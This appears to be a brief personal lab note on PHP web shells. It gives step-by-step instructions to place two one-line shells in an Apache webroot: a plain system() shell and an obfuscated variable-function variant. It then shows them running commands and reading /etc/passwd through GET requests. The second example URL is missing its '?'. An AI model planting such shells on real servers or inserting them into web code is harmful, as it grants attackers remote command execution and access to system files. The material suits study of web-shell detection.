---
description: 4/13/2023
---

# PHP Web Shell Lab

### PHP Shell that allows command exec. via GET request

* Create a new file called `shell.php` in the Apache webroot (`/var/www/html`)
* Add to the file: `<?php system($_GET['cmd']); ?>`
* Save and exit, and navigate to `http://server-ip/shell.php?cmd=ls` to execute the `ls` command
* Create a new file called `get.php`
* Add to the file: `<?php $g=$_GET['_']; $e=$_GET['__']; $g($e); ?>`
* Save and exit, and navigate to `http://server-ip/get.php_=system&__=cat%20/etc/passwd`
